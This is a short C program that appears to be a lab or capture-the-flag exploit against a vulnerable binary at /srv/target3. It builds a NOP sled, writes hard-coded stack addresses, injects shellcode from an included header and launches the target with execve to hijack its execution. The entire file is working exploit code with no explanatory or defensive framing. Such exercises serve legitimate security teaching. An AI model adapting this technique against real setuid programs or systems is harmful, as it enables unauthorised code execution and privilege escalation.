#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int BUFFER_SIZE = 400;
const int SHELLCODE_OFFSET = 201;
const uint32_t BASE_ADDRESS = 0xffffdec0;

void prepareEnvironment(char *environment) {
    memset(environment, 0x90, BUFFER_SIZE - 1);

    uint32_t *ptr = (uint32_t *)environment;
    *ptr++ = BASE_ADDRESS + 4;
    *ptr++ = BASE_ADDRESS + 8;

    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
}

int main(void)
{
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };
    char environment[400] = {0};
    prepareEnvironment(environment);
    char *env[] = {environment, NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}